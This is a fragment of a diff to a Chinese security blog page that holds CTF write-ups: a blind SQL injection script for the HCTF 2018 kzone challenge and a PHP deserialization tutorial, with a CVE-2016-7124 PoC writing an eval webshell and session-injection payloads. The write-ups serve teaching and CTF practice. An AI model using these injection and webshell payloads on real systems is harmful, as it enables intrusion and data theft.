string.ascii_letters+string.digits+&apos;&#123;&#125;!@#$*&amp;_,&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check(payload):</span><br><span class="line">    cookie=&#123;</span><br><span class="line">        &apos;PHPSESSID&apos;:&apos;8ehnp28ccr4ueh3gnfc3uqtau1&apos;,</span><br><span class="line">        &apos;islogin&apos;:&apos;1&apos;,</span><br><span class="line">        &apos;login_data&apos;:payload</span><br><span class="line">    &#125;</span><br><span class="line">    try:</span><br><span class="line">        requests.get(url,cookies=cookie,timeout=3)</span><br><span class="line">        return 0</span><br><span class="line">    except:</span><br><span class="line">        return 1</span><br><span class="line"></span><br><span class="line">result=&apos;&apos;</span><br><span class="line">for i in range(1,33):</span><br><span class="line">    for j in str1:</span><br><span class="line">        payload = &apos;&#123;&quot;admin_user&quot;:&quot;admin\&apos;/**/and/**/\\u0069f(\\u0061scii(\\u0073ubstr((select/**/table_name/**/from/**/inf\\u006Frmation_schema.tables/**/where/**/table_schema\\u003ddatabase()/**/limit/**/0,1),%s,1))\\u003d\&apos;%s\&apos;,\\u0073leep(4),1)/**/and/**/\&apos;1&quot;&#125;&apos;% (str(i),ord(j))</span><br><span class="line">        payload = &apos;&#123;&quot;admin_user&quot;:&quot;admin\&apos;/**/and/**/\\u0069f(\\u0061scii(\\u0073ubstr((select/**/F1a9/**/from/**/F1444g),%s,1))\\u003d%s,\\u0073leep(4),1)/**/and/**/\&apos;1&quot;,&quot;admin_pass&quot;:&quot;123&quot;&#125;&apos;% (str(i),ord(j))      </span><br><span class="line">        #print(&apos;[+]&apos;+payload)</span><br><span class="line">        if check(payload):     </span><br><span class="line">            result += j</span><br><span class="line">            break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
+<p>function safe($string)<br>{<br>    if (is_array($string)) {<br>        foreach ($string as $key =&gt; $val) {<br>            $string[$key] = safe($val);<br>        }<br>    } else {<br>        $string = waf($string);<br>    }<br>    return $string;<br>}</p>
+<pre><code>匹配到这些会在关键字前后添加@
 
-<p>只要是请求的页面包含common.php此脚本都能行得通，因为会引入member.php</p>
+2. member根据cookie判断是否已经登陆
+3. founction封装了一些功能函数
+4. db.class一些执行的sql语句
 
+## 思路
+### ip
+刚开始审的时候看到了insert把ip入库，而且ip的获取是这样的：
+![](https://i.loli.net/2018/11/13/5beac380388eb.jpg)
+不用经过safe的过滤，但是下面的ip2long会把超限度的ip置空，因此ip注入行不通
+
+### bypass
+因为有全局过滤safe，所以一开始在想可不可以bypass掉，用hex绕过is_number的检测，使我们注入的语句不会经过filter。确实成功执行了我用hex传入的语句，但是mysql仅仅是把hex的值入库了，也无法进行二次利用。
+
+### member.php
+当时他们说可以用json形式的cookie注入,unicode编码绕过于是去看cookie逻辑登陆的地方
+
+![](https://i.loli.net/2018/11/13/5beac35ebedb4.png)
+
+cookie传入参数login_data解析查库，用了json_decode，那么就可以用unicode编码无视过滤
+![](https://i.loli.net/2018/11/13/5beac38e39abe.png)
+
+剩下的就是编写tamper脚本了，把payload替换成unicode。但是看到了微笑师傅的一个py脚本，不借助sqlmap，觉得写的很好，贴出来</code></pre><h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding: utf-8 --"></a>-<em>- coding: utf-8 -</em>-</h1><p>import requests<br>import string</p>
+<p>url = ‘<a href="http://kzone.2018.hctf.io/include/common.php&#39;" target="_blank" rel="noopener">http://kzone.2018.hctf.io/include/common.php&#39;</a><br>str1 = string.ascii_letters+string.digits+’{}!@#$*&amp;_,’</p>
+<p>def check(payload):<br>    cookie={<br>        ‘PHPSESSID’:’8ehnp28ccr4ueh3gnfc3uqtau1’,<br>        ‘islogin’:’1’,<br>        ‘login_data’:payload<br>    }<br>    try:<br>        requests.get(url,cookies=cookie,timeout=3)<br>        return 0<br>    except:<br>        return 1</p>
+<p>result=’’<br>for i in range(1,33):<br>    for j in str1:<br>        payload = ‘{“admin_user”:”admin&#39;/<strong>/and/</strong>/\u0069f(\u0061scii(\u0073ubstr((select/<strong>/table_name/</strong>/from/<strong>/inf\u006Frmation_schema.tables/</strong>/where/<strong>/table_schema\u003ddatabase()/</strong>/limit/<strong>/0,1),%s,1))\u003d&#39;%s&#39;,\u0073leep(4),1)/</strong>/and/<strong>/&#39;1”}’% (str(i),ord(j))<br>        payload = ‘{“admin_user”:”admin&#39;/</strong>/and/<strong>/\u0069f(\u0061scii(\u0073ubstr((select/</strong>/F1a9/<strong>/from/</strong>/F1444g),%s,1))\u003d%s,\u0073leep(4),1)/<strong>/and/</strong>/&#39;1”,”admin_pass”:”123”}’% (str(i),ord(j))<br>        #print(‘[+]’+payload)<br>        if check(payload):<br>            result += j<br>            break<br>    print(result)</p>
+<pre><code>
+只要是请求的页面包含common.php此脚本都能行得通，因为会引入member.php
+
+
+
+
+</code></pre>
                 
             </div>
             <div class="continue">
             <a href="/2018/11/13/HCTF题解/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -803,7 +1299,7 @@
             </div>
             <div class="continue">
             <a href="/2018/10/22/ISCC2018 信阳杯线下赛小结/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -830,86 +1326,138 @@
 <h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p>最近在总结php序列化相关的知识，看了好多前辈师傅的文章，决定对四个理解难度递进的序列化思路进行一个复现剖析。包括最近Blackhat议题披露的phar拓展php反序列化漏洞攻击面。前人栽树，后人乘凉，担着前辈师傅们的辅拓前行！</p>
 <h2 id="D0g3"><a href="#D0g3" class="headerlink" title="D0g3"></a>D0g3</h2><p>为了让大家进入状态，来一道简单的反序列化小题，新来的表哥们可以先学习一下php序列化和反序列化。顺便安利一下D0g3小组的平台，后面会有题不断上新哦~<br>题目平台地址：<a href="http://ctf.d0g3.cn" target="_blank" rel="noopener">http://ctf.d0g3.cn</a><br>题目入口：<a href="http://120.79.33.253:9001" target="_blank" rel="noopener">http://120.79.33.253:9001</a></p>
 <p>页面给了源码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">$KEY = &quot;D0g3!!!&quot;;</span><br><span class="line">$str = $_GET[&apos;str&apos;];</span><br><span class="line">if (unserialize($str) === &quot;$KEY&quot;)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;$flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">show_source(__FILE__);</span><br></pre></td></tr></table></figure>
-
-<p>提醒大家补充php序列化知识的水题~</p>
+<pre><code>&lt;?php
+error_reporting(0);
+include &quot;flag.php&quot;;
+$KEY = &quot;D0g3!!!&quot;;
+$str = $_GET[&#39;str&#39;];
+if (unserialize($str) === &quot;$KEY&quot;)
+{
+    echo &quot;$flag&quot;;
+}
+show_source(__FILE__);</code></pre><p>提醒大家补充php序列化知识的水题~</p>
 <p>直接上传<code>s:7:&quot;D0g3!!!&quot;</code>即可get flag</p>
 <h2 id="绕过魔法函数的反序列化漏洞"><a href="#绕过魔法函数的反序列化漏洞" class="headerlink" title="绕过魔法函数的反序列化漏洞"></a>绕过魔法函数的反序列化漏洞</h2><p>漏洞编号CVE-2016-7124</p>
 <h3 id="魔法函数-sleep-和-wakeup"><a href="#魔法函数-sleep-和-wakeup" class="headerlink" title="魔法函数__sleep() 和 __wakeup()"></a>魔法函数__sleep() 和 __wakeup()</h3><p><strong>php文档中定义__wakeup():</strong></p>
 <p>unserialize() 执行时会检查是否存在一个 <strong>wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</strong>wakeup()经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。__sleep()则相反，是用在序列化一个对象时被调用</p>
 <p><img src="https://i.loli.net/2018/09/06/5b90f6d1d8152.png" alt></p>
 <h3 id="漏洞剖析"><a href="#漏洞剖析" class="headerlink" title="漏洞剖析"></a>漏洞剖析</h3><p>PHP5 &lt; 5.6.25<br>PHP7 &lt; 7.0.10<br>PHP官方给了示例：<a href="https://bugs.php.net/bug.php?id=72663" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=72663</a><br>这个漏洞核心：<strong>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</strong>比如下面这个类构造：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class hpdoger&#123;</span><br><span class="line">    public $a = &apos;nice to meet u&apos;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>序列化这个类得到的结果：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;hpdoger&quot;:1:&#123;s:1:&quot;a&quot;;s:6:&quot;nice to meet u&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>简单解释一下这个序列化字符串：<br>O代表结构类型为：类，7表示类名长度，接着是类名、属性（成员）个数<br>大括号内分别是：属性名类型、长度、名称；值类型、长度、值</p>
+<pre><code>class hpdoger{
+    public $a = &#39;nice to meet u&#39;;
+    }</code></pre><p>序列化这个类得到的结果：</p>
+<pre><code>O:7:&quot;hpdoger&quot;:1:{s:1:&quot;a&quot;;s:6:&quot;nice to meet u&quot;;}</code></pre><p>简单解释一下这个序列化字符串：<br>O代表结构类型为：类，7表示类名长度，接着是类名、属性（成员）个数<br>大括号内分别是：属性名类型、长度、名称；值类型、长度、值</p>
 <p>正常情况下，反序列化一个类得到的结果：<br><img src="https://i.loli.net/2018/09/06/5b90f7f9ae0d0.jpg" alt></p>
 <p>析构方法和__wakeup都能够执行</p>
 <p>如果我们把传入的序列化字符串的属性个数更改成大于1的任何数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;hpdoger&quot;:2:&#123;s:1:&quot;a&quot;;s:6:&quot;u know&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>得到的结果如图，__wakeup没有被执行，但是执行了析构函数<br><img src="https://i.loli.net/2018/09/06/5b90f8ecc8319.png" alt></p>
+<pre><code>O:7:&quot;hpdoger&quot;:2:{s:1:&quot;a&quot;;s:6:&quot;u know&quot;;}</code></pre><p>得到的结果如图，__wakeup没有被执行，但是执行了析构函数<br><img src="https://i.loli.net/2018/09/06/5b90f8ecc8319.png" alt></p>
 <p>假如我们的demo是这样的呢?</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    var $a = &quot;test&quot;;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        $fp = fopen(&quot;D:\\phpStudy\\PHPTutorial\\WWW\\test\\shell.php&quot;,&quot;w&quot;);</span><br><span class="line">        fputs($fp,$this-&gt;a);</span><br><span class="line">        fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup()</span><br><span class="line">        &#123;</span><br><span class="line">            foreach(get_object_vars($this) as $k =&gt; $v) &#123;</span><br><span class="line">                    $this-&gt;$k = null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$hpdoger = $_POST[&apos;hpdoger&apos;];</span><br><span class="line">$clan = unserialize($hpdoger);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>每次反序列化是都会调用__wakeup从而把$a值清空。但是，如果我们绕过wakeup不就能写Shell了？既然反序列化的内容是可控的，就利用上述的方法绕过wakeup。</p>
+<pre><code>&lt;?php
+class A{
+    var $a = &quot;test&quot;;
+    function __destruct(){
+        $fp = fopen(&quot;D:\\phpStudy\\PHPTutorial\\WWW\\test\\shell.php&quot;,&quot;w&quot;);
+        fputs($fp,$this-&gt;a);
+        fclose($fp);
+    }
+    function __wakeup()
+        {
+            foreach(get_object_vars($this) as $k =&gt; $v) {
+                    $this-&gt;$k = null;
+            }
+        }
+}
+$hpdoger = $_POST[&#39;hpdoger&#39;];
+$clan = unserialize($hpdoger);
+?&gt;</code></pre><p>每次反序列化是都会调用__wakeup从而把$a值清空。但是，如果我们绕过wakeup不就能写Shell了？既然反序列化的内容是可控的，就利用上述的方法绕过wakeup。</p>
 <p>poc:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;s:27:&quot;&lt;?php eval($_POST[&quot;hp&quot;]);?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="序列化漏洞常见的魔法函数"><a href="#序列化漏洞常见的魔法函数" class="headerlink" title="序列化漏洞常见的魔法函数"></a>序列化漏洞常见的魔法函数</h3><p>__construct():当一个类被创建时自动调用<br>__destruct():当一个类被销毁时自动调用<br>__invoke():当把一个类当作函数使用时自动调用<br>__tostring():当把一个类当作字符串使用时自动调用<br>__wakeup():当调用unserialize()函数时自动调用<br>__sleep():当调用serialize()函数时自动调用<br>__call():当要调用的方法不存在或权限不足时自动调用</p>
+<pre><code>O:1:&quot;A&quot;:2:{s:1:&quot;a&quot;;s:27:&quot;&lt;?php eval($_POST[&quot;hp&quot;]);?&gt;&quot;;}</code></pre><h3 id="序列化漏洞常见的魔法函数"><a href="#序列化漏洞常见的魔法函数" class="headerlink" title="序列化漏洞常见的魔法函数"></a>序列化漏洞常见的魔法函数</h3><p>__construct():当一个类被创建时自动调用<br>__destruct():当一个类被销毁时自动调用<br>__invoke():当把一个类当作函数使用时自动调用<br>__tostring():当把一个类当作字符串使用时自动调用<br>__wakeup():当调用unserialize()函数时自动调用<br>__sleep():当调用serialize()函数时自动调用<br>__call():当要调用的方法不存在或权限不足时自动调用</p>
 <h2 id="Session反序列化漏洞"><a href="#Session反序列化漏洞" class="headerlink" title="Session反序列化漏洞"></a>Session反序列化漏洞</h2><h3 id="Session序列化机制"><a href="#Session序列化机制" class="headerlink" title="Session序列化机制"></a>Session序列化机制</h3><p>提到这个漏洞，就得先知道什么叫Session序列化机制。</p>
 <p>当session_start()被调用或者php.ini中session.auto_start为1时，PHP内部调用会话管理器，访问用户session被序列化以后，存储到指定目录（默认为/tmp）。</p>
 <p>PHP处理器的三种序列化方式：<br>| 处理器         | 对应的存储格式    |<br>| —————— |:———————|<br>| php_binary      | 键名的长度对应的ASCII字符＋键名＋经过serialize() 函数反序列处理的值 |<br>| php           | 键名＋竖线＋经过serialize()函数反序列处理的值   |<br>|php_serialize |serialize()函数反序列处理数组方式|</p>
 <p>配置文件php.ini中含有这几个与session存储配置相关的配置项：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session.save_path=&quot;&quot;   --设置session的存储路径,默认在/tmp</span><br><span class="line">session.auto_start   --指定会话模块是否在请求开始时启动一个会话,默认为0不启动</span><br><span class="line">session.serialize_handler   --定义用来序列化/反序列化的处理器名字。默认使用php</span><br></pre></td></tr></table></figure>
+<pre><code>session.save_path=&quot;&quot;   --设置session的存储路径,默认在/tmp
+session.auto_start   --指定会话模块是否在请求开始时启动一个会话,默认为0不启动
+session.serialize_handler   --定义用来序列化/反序列化的处理器名字。默认使用php</code></pre><p>一个简单的demo(session.php)认识一下存储过程：</p>
+<pre><code>&lt;?php
+ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);
+session_start();
 
-<p>一个简单的demo(session.php)认识一下存储过程：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;,&apos;php_serialize&apos;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$_SESSION[&apos;hpdoger&apos;] = $_GET[&apos;hpdoger&apos;];</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+$_SESSION[&#39;hpdoger&#39;] = $_GET[&#39;hpdoger&#39;];
 
-<p>访问页面</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/test/session.php?hpdoger=lover</span><br></pre></td></tr></table></figure>
-
-<p>在session.save_path对应路径下会生成一个文件，名称例如:sess_1ja9n59ssk975tff3r0b2sojd5<br>因为选择的序列化处理方式为php_serialize,所以是被serialize()函数处理过的$_SESSION[‘hpdoger’]。存储文件内容：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:7:&quot;hpdoger&quot;;s:5:&quot;lover&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>如果选择的序列化处理方式为php，即<code>ini_set(&#39;session.serialize_handler&#39;,&#39;php&#39;);</code>,则存储内容为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hpdoger|s:5:&quot;lover&quot;;</span><br></pre></td></tr></table></figure>
-
-<h3 id="漏洞剖析-1"><a href="#漏洞剖析-1" class="headerlink" title="漏洞剖析"></a>漏洞剖析</h3><p>选择的处理方式不同，序列化和反序列化的方式亦不同。如果网站序列化并存储Session与反序列化并读取Session的方式不同，就可能导致漏洞的产生。</p>
+?&gt;</code></pre><p>访问页面</p>
+<pre><code>http://localhost/test/session.php?hpdoger=lover</code></pre><p>在session.save_path对应路径下会生成一个文件，名称例如:sess_1ja9n59ssk975tff3r0b2sojd5<br>因为选择的序列化处理方式为php_serialize,所以是被serialize()函数处理过的$_SESSION[‘hpdoger’]。存储文件内容：</p>
+<pre><code>a:1:{s:7:&quot;hpdoger&quot;;s:5:&quot;lover&quot;;}</code></pre><p>如果选择的序列化处理方式为php，即<code>ini_set(&#39;session.serialize_handler&#39;,&#39;php&#39;);</code>,则存储内容为：</p>
+<pre><code>hpdoger|s:5:&quot;lover&quot;;</code></pre><h3 id="漏洞剖析-1"><a href="#漏洞剖析-1" class="headerlink" title="漏洞剖析"></a>漏洞剖析</h3><p>选择的处理方式不同，序列化和反序列化的方式亦不同。如果网站序列化并存储Session与反序列化并读取Session的方式不同，就可能导致漏洞的产生。</p>
 <p>这里提供一个demo：</p>
 <p>存储Session页面</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/*session.php*/</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;,&apos;php_serialize&apos;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$_SESSION[&apos;hpdoger&apos;] = $_GET[&apos;hpdoger&apos;];</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>/*session.php*/
 
-<p>可利用页面</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/*test.php*/</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;,&apos;php&apos;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">class hpdoger&#123;</span><br><span class="line">	var $a;</span><br><span class="line"></span><br><span class="line">	function __destruct()&#123;</span><br><span class="line">		$fp = fopen(&quot;D:\\phpStudy\\PHPTutorial\\WWW\\test\\shell.php&quot;,&quot;w&quot;);</span><br><span class="line">		fputs($fp,$this-&gt;a);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+&lt;?php
+ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);
+session_start();
 
-<p>访问第一个页面的poc:<br><img src="https://i.loli.net/2018/09/06/5b90f6078e2c6.png" alt></p>
+$_SESSION[&#39;hpdoger&#39;] = $_GET[&#39;hpdoger&#39;];
+
+?&gt;</code></pre><p>可利用页面</p>
+<pre><code>/*test.php*/
+
+&lt;?php 
+ini_set(&#39;session.serialize_handler&#39;,&#39;php&#39;);
+session_start();
+
+class hpdoger{
+    var $a;
+
+    function __destruct(){
+        $fp = fopen(&quot;D:\\phpStudy\\PHPTutorial\\WWW\\test\\shell.php&quot;,&quot;w&quot;);
+        fputs($fp,$this-&gt;a);
+        fclose($fp);
+    }
+}
+
+?&gt;</code></pre><p>访问第一个页面的poc:<br><img src="https://i.loli.net/2018/09/06/5b90f6078e2c6.png" alt></p>
 <p>/tmp目录下生成的session文件内容：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:7:&quot;hpdoger&quot;;s:52:&quot;|O:7:&quot;hpdoger&quot;:1:&#123;s:1:&quot;a&quot;;s:17:&quot;&lt;?php phpinfo()?&gt;&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>再访问test.php时反序列化已存储的session，新的php处理方式会把“|”后的值当作KEY值再serialize()，相当于我们实例化了这个页面的hpdoger类，相当于执行:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&apos;hpdoger&apos;] = new hpdoger();</span><br><span class="line">$_SESSION[&apos;hpdoger&apos;]-&gt;a = &apos;&lt;?php phpinfo()?&gt;&apos;;</span><br></pre></td></tr></table></figure>
-
-<p>在指定的目录D:\phpStudy\PHPTutorial\WWW\test\shell.php中会写入内容<code>&lt;?php phpinfo()?&gt;</code><br><img src="https://i.loli.net/2018/09/06/5b90f607d6b3a.jpg" alt></p>
+<pre><code>a:1:{s:7:&quot;hpdoger&quot;;s:52:&quot;|O:7:&quot;hpdoger&quot;:1:{s:1:&quot;a&quot;;s:17:&quot;&lt;?php phpinfo()?&gt;&quot;;}&quot;;}</code></pre><p>再访问test.php时反序列化已存储的session，新的php处理方式会把“|”后的值当作KEY值再serialize()，相当于我们实例化了这个页面的hpdoger类，相当于执行:</p>
+<pre><code>$_SESSION[&#39;hpdoger&#39;] = new hpdoger();
+$_SESSION[&#39;hpdoger&#39;]-&gt;a = &#39;&lt;?php phpinfo()?&gt;&#39;;</code></pre><p>在指定的目录D:\phpStudy\PHPTutorial\WWW\test\shell.php中会写入内容<code>&lt;?php phpinfo()?&gt;</code><br><img src="https://i.loli.net/2018/09/06/5b90f607d6b3a.jpg" alt></p>
 <h3 id="jarvisoj-web的一道SESSION反序列化"><a href="#jarvisoj-web的一道SESSION反序列化" class="headerlink" title="jarvisoj-web的一道SESSION反序列化"></a>jarvisoj-web的一道SESSION反序列化</h3><p>题目入口(<a href="http://web.jarvisoj.com:32784/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/index.php</a>)<br>Index页给源码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//A webshell is wait for you</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</span><br><span class="line">session_start();</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mdzz = &apos;phpinfo();&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&apos;phpinfo&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = new OowoO();</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(&apos;index.php&apos;));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>&lt;?php
+//A webshell is wait for you
+ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);
+session_start();
+class OowoO
+{
+    public $mdzz;
+    function __construct()
+    {
+        $this-&gt;mdzz = &#39;phpinfo();&#39;;
+    }
 
-<p>看到ini_set(‘session.serialize_handler’, ‘php’);</p>
+    function __destruct()
+    {
+        eval($this-&gt;mdzz);
+    }
+}
+if(isset($_GET[&#39;phpinfo&#39;]))
+{
+    $m = new OowoO();
+}
+else
+{
+    highlight_string(file_get_contents(&#39;index.php&#39;));
+}
+?&gt;</code></pre><p>看到ini_set(‘session.serialize_handler’, ‘php’);</p>
 <p>暂时没找到用php_serialize添加session的方法。但看到当get传入phpinfo时会实例化OowoO这个类并访问phpinfo()<br><img src="https://i.loli.net/2018/09/07/5b927fb850e32.png" alt></p>
 <p>这里参考Chybeta师傅的一个姿势：session.upload_progress.enabled为On。session.upload_progress.enabled本身作用不大，是用来检测一个文件上传的进度。但当一个文件上传时，同时POST一个与php.ini中session.upload_progress.name同名的变量时（session.upload_progress.name的变量值默认为PHP_SESSION_UPLOAD_PROGRESS），PHP检测到这种同名请求会在$_SESSION中添加一条数据。我们由此来设置session。</p>
 <p>构造上传的表单poc，列出当前目录:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;|O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:26:&quot;print_r(scandir(__dir__));&quot;;&#125;&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
-
-<p>通过phpinfo页面查看当前路径<code>_SERVER[&quot;SCRIPT_FILENAME&quot;]</code><br><img src="https://i.loli.net/2018/09/07/5b927fb844eb0.png" alt></p>
+<pre><code>&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:26:&quot;print_r(scandir(__dir__));&quot;;}&quot; /&gt;
+    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;
+    &lt;input type=&quot;submit&quot; /&gt;
+&lt;/form&gt;</code></pre><p>通过phpinfo页面查看当前路径<code>_SERVER[&quot;SCRIPT_FILENAME&quot;]</code><br><img src="https://i.loli.net/2018/09/07/5b927fb844eb0.png" alt></p>
 <p>读文件就行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:88:&quot;print_r(file_get_contents(/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php));&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>得到flag</p>
